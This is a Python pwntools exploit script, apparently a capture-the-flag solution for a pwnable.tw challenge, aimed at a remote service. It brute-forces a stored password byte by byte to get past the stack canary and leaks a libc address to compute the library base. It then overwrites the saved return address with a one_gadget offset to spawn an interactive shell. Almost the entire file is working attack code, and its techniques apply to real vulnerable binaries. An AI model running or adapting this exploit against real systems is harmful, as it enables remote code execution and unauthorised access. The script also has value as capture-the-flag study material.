from pwn import *

libc_bin = ELF('./libc_64.so.6')


context.log_level = "debug"
io = remote('chall.pwnable.tw', 10205, timeout=2)


class App:
    'class to interacte with the application'

    def __init__(self, proc):
        self.proc = proc
        # stores recoved stack data so that continue the
        # stack search if you set this value to appropriate
        # values
        self.recov_data = []

    def password(self, pwd, flag=0):
        self.proc.readuntil('>> ')
        # this input is give so that null-byte is not introducted
        # in user_action buffer
        self.proc.send('1' + 'B'*15)
        self.proc.readuntil('owrd :')
        self.proc.send(pwd)
        # return the input to check if the password or
        # correct or not
        res = self.proc.readuntil('!\n')
        return res.decode('utf-8')

    def exit(self):
        # exit application
        self.proc.readuntil('>> ')
        self.proc.send('2')

    def copy(self, buf):
        # triggers copy_user_input function
        self.proc.readuntil('>> ')
        self.proc.send('3' + 'B' * 15)
        self.proc.readuntil('Copy :')
        self.proc.send(buf)
        self.proc.readuntil('It is magic copy !\n')

    def recover_stack(self, stack_len=16, verbose=True):
        # nice wrapper function to brute-forcing wrapper
        # to recoved buffer of desired size 
        data = self.recov_data
        start = len(data)
        for sz in range(start, stack_len):
            for i in range(1, 256):
                b_data = b''.join(data) + p8(i) + p8(0)
                res = app.password(b_data)
                if res.find('Login Success !') >= 0:
                    data.append(p8(i))
                    break
        log.info('Recovered Len : ' + str(len(data)))
        self.recov_data = data
        return data

def leak_libc_base():
    vul_buf = 'C'*72
    app.password(vul_buf)
    app.password(p8(0))
    app.copy('CCCC')
    app.recov_data = [p8(0x43) for i in range(8)]
    st_data = app.recover_stack(14)
    libc_addr = u64(b''.join(st_data[8:]) + p8(0)*2)
    log.info('Leak addr : ' + hex(libc_addr))
    variable_offset = 0x7a81b
    libc_base = libc_addr - variable_offset
    log.info('Libc Base : ' + hex(libc_base))
    return libc_base


# Author  : 0xd3xt3r
# Website : taintedbits.com

app = App(io)

log.info('Leaking password')

# recover original password to bypass stack canary
# we will use this data later
real_password = app.recover_stack(16)
print(hexdump(real_password))
log.info('Password leaking done!')

# this is done to put the app in de-auth app state
app.password(p8(0))

log.info('Initialized libc base leak!')
libc_base_addr = leak_libc_base()
libc_bin.address = libc_base_addr
log.info('Leaked libc base')

# the magic of one_gadget tool
oneshot_shell_addr = libc_base_addr + 0xf0567

# this is done to put the app in de-auth app state
app.password(p8(0))

exploit_payload = {
    # pass the memcmp condition with the real password
    # this check will help you avoid stack canary check
    0x40: real_password,
    # override return address
    0x68: p64(oneshot_shell_addr)
}

# prime the stack with exploit buffer
app.password(flat(exploit_payload))
log.info('Payload copied')

# put the app in authicated state to do proper function return,
# and not exit() call exit
app.password(p8(0))
app.copy('A'*3)

app.exit()
io.interactive()